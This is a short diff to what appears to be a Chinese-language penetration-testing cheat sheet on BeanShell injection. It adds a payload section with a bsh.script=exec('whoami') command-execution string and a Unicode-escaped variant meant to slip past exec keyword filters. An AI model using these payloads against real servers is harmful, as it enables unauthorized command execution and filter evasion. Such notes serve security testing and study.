@@ -9,6 +9,15 @@
 检测目标系统os.name（因为目标系统是windows的话，执行set等命令，需要手动敲cmd.exe /c set）
 使用Unicode绕过exec过滤，部分站点
 ```
+## Payload
+```
+bsh.script=exec('whoami');
+
+>>>>unicode bypass
+
+bsh.script=\u0065\u0078\u0065\u0063("whoami");
+
+```
 
 ## Useful BeanShell Commands
 
